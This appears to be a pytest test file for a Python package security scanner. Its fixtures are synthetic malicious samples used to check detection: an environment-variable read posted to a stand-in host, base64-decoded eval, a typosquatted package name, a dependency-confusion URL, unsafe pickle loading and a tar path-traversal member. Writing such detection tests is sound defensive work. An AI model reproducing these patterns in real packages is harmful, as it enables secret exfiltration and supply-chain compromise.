from __future__ import annotations

import io
import tarfile
import zipfile
from pathlib import Path

import pytest
from typer.testing import CliRunner

from pypi_ai.ai import ProviderRequest, explain_from_evidence
from pypi_ai.cli import app
from pypi_ai.intelligence import Advisory
from pypi_ai.models import Severity
from pypi_ai.reports import render_report
from pypi_ai.scanner import scan_path

runner = CliRunner()


def _write_package(root: Path, name: str, source: str, metadata: str | None = None) -> Path:
    package_dir = root / name
    package_dir.mkdir()
    if metadata is not None:
        (package_dir / "pyproject.toml").write_text(metadata, encoding="utf-8")
    (package_dir / "module.py").write_text(source, encoding="utf-8")
    return package_dir


def _rule_ids(target: Path) -> set[str]:
    return {finding.rule_id for finding in scan_path(target).findings}


def test_final_qa_benign_package_stays_low_noise(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "benign_pkg",
        "def add(a, b):\n    return a + b\n",
        '[project]\nname = "benign-demo"\nversion = "1.0.0"\n',
    )

    result = scan_path(package_dir)

    assert result.summary.files_scanned == 1
    assert result.summary.total_findings == 0
    assert result.risk.level == Severity.INFO


def test_final_qa_detects_environment_and_network_chain(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "env_network_pkg",
        "import os\nimport requests\n"
        "demo_value = os.environ.get('DEMO_VALUE')\n"
        "requests.post('https://example.invalid/demo', data={'value': demo_value})\n",
    )

    rules = _rule_ids(package_dir)

    assert "PY001_ENV_ACCESS" in rules
    assert "PY003_NETWORK_CLIENT" in rules


def test_final_qa_detects_alias_evasion_for_subprocess_and_requests(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "alias_pkg",
        "import subprocess as sp\nfrom subprocess import run\nimport requests as r\n"
        "sp.run(['echo', 'demo'])\nrun(['echo', 'demo'])\nr.post('https://example.invalid/demo')\n",
    )

    rules = _rule_ids(package_dir)

    assert "PY014_IMPORT_ALIAS_RISK" in rules
    assert "PY002_SUBPROCESS" in rules
    assert "PY003_NETWORK_CLIENT" in rules


def test_final_qa_detects_obfuscation_dynamic_execution_and_secret_like_placeholder(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "obfuscated_pkg",
        "import base64\n"
        "payload = base64.b64decode('ZXZhbCgnMScp')\n"
        "eval(payload.decode())\n"
        "demo_password = 'not-a-real-demo-value'\n",
    )

    rules = _rule_ids(package_dir)

    assert "PY004_OBFUSCATION" in rules
    assert "PY005_DYNAMIC_EXEC" in rules
    assert "PY013_SECRET_PATTERN_IN_CODE" in rules


def test_final_qa_detects_metadata_supply_chain_signals(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "metadata_pkg",
        "VALUE = 1\n",
        "[project]\n"
        'name = "colourama"\n'
        'version = "9.9.9"\n'
        'authors = [{name = "Alice", email = "alice@example.com"}]\n'
        'maintainers = [{name = "Mallory", email = "mallory@example.invalid"}]\n'
        'dependencies = ["internal-client @ https://packages.example.invalid/internal.whl"]\n'
        "[project.urls]\n"
        'Homepage = "http://bit.ly/not-real"\n',
    )

    rules = _rule_ids(package_dir)

    assert "PY009_TYPOSQUAT_RISK" in rules
    assert "PY010_SUSPICIOUS_HOMEPAGE" in rules
    assert "PY011_AUTHOR_MAINTAINER_MISMATCH" in rules
    assert "PY012_DEPENDENCY_CONFUSION_SIGNAL" in rules


def test_final_qa_ignored_rules_reduce_noise_for_user_config(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "network_only_pkg",
        "import requests\nrequests.post('https://example.invalid/demo')\n",
    )

    raw = scan_path(package_dir)
    filtered = scan_path(package_dir, ignored_rules=["PY003_NETWORK_CLIENT"])

    assert any(finding.rule_id == "PY003_NETWORK_CLIENT" for finding in raw.findings)
    assert not any(finding.rule_id == "PY003_NETWORK_CLIENT" for finding in filtered.findings)
    assert filtered.risk.score < raw.risk.score


def test_final_qa_osv_advisory_finding_uses_fake_database_client(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "known_risk_pkg",
        "VALUE = 1\n",
        '[project]\nname = "known-risk"\nversion = "1.2.3"\n',
    )

    def fake_lookup(name: str, version: str | None) -> list[Advisory]:
        assert (name, version) == ("known-risk", "1.2.3")
        return [Advisory("QA-2099-0001", "Synthetic advisory", "Details", [])]

    result = scan_path(package_dir, advisory_lookup=fake_lookup)

    assert result.findings[0].rule_id == "PY015_OSV_ADVISORY"
    assert "QA-2099-0001" in result.findings[0].snippet


def test_final_qa_scans_wheel_and_sdist_archives(tmp_path: Path) -> None:
    wheel = tmp_path / "demo-0.1-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as archive:
        archive.writestr("demo/__init__.py", "import socket\nsocket.socket()\n")

    source = tmp_path / "source"
    package = source / "sdist_demo"
    package.mkdir(parents=True)
    (package / "__init__.py").write_text("import pickle\npickle.loads(b'x')\n", encoding="utf-8")
    sdist = tmp_path / "sdist-demo-0.1.tar.gz"
    with tarfile.open(sdist, "w:gz") as archive:
        archive.add(source, arcname="sdist-demo-0.1")

    wheel_rules = _rule_ids(wheel)
    sdist_rules = _rule_ids(sdist)

    assert "PY003_NETWORK_CLIENT" in wheel_rules
    assert "PY006_UNSAFE_DESERIALIZATION" in sdist_rules


def test_final_qa_rejects_tar_path_traversal(tmp_path: Path) -> None:
    sdist = tmp_path / "bad.tar.gz"
    payload = b"VALUE = 1\n"
    info = tarfile.TarInfo("../escape.py")
    info.size = len(payload)
    with tarfile.open(sdist, "w:gz") as archive:
        archive.addfile(info, io.BytesIO(payload))

    with pytest.raises(ValueError, match="Unsafe tar member"):
        scan_path(sdist)


def test_final_qa_renders_json_html_pdf_reports(tmp_path: Path) -> None:
    package_dir = _write_package(tmp_path, "report_pkg", "eval('1')\n")
    result = scan_path(package_dir)
    output_base = tmp_path / "reports" / "scan-result"

    written = render_report(result, output_base=output_base, formats=["all"], show_citations=True)

    assert output_base.with_suffix(".json") in written
    assert output_base.with_suffix(".html") in written
    assert output_base.with_suffix(".pdf") in written
    assert "Evidence Report" in output_base.with_suffix(".html").read_text(encoding="utf-8")
    assert output_base.with_suffix(".pdf").stat().st_size > 0


def test_final_qa_ai_verifies_model_output_and_drops_unsupported_sentences(tmp_path: Path) -> None:
    package_dir = _write_package(tmp_path, "ai_pkg", "eval('1')\n")
    finding = scan_path(package_dir).findings[0]
    seen: list[ProviderRequest] = []

    def fake_model(request: ProviderRequest) -> str:
        seen.append(request)
        return (
            f"Dynamic execution is present and evidence-backed. [{finding.finding_id}]\n"
            "Unsupported sentence without evidence id."
        )

    explanation = explain_from_evidence(
        [finding], provider="ollama-local", model="qa-model", transport=fake_model
    )

    assert seen and seen[0].provider == "ollama-local"
    assert explanation.used_fallback is False
    assert explanation.sentences == [
        f"Dynamic execution is present and evidence-backed. [{finding.finding_id}]"
    ]


def test_final_qa_ollama_local_provider_path_falls_back_without_crashing(tmp_path: Path) -> None:
    package_dir = _write_package(tmp_path, "live_provider_pkg", "eval('1')\n")
    finding = scan_path(package_dir).findings[0]

    explanation = explain_from_evidence([finding], provider="ollama-local", timeout_seconds=0.05)

    assert explanation.provider.startswith("ollama-local:")
    assert explanation.sentences
    assert any(f"[{finding.finding_id}]" in sentence for sentence in explanation.sentences)


def test_final_qa_cli_review_mode_command_matches_readme(tmp_path: Path) -> None:
    package_dir = _write_package(
        tmp_path,
        "cli_pkg",
        "import os\nVALUE = os.environ.get('DEMO_VALUE')\n",
    )

    result = runner.invoke(
        app,
        [
            "--no-color",
            "scan",
            str(package_dir),
            "--review-mode",
            "--show-evidence",
            "--format",
            "json",
            "--no-ai",
        ],
    )

    assert result.exit_code == 0
    assert "Scan plan" in result.output
    assert "PY001_ENV_ACCESS" in result.output
    assert "Traceback" not in result.output
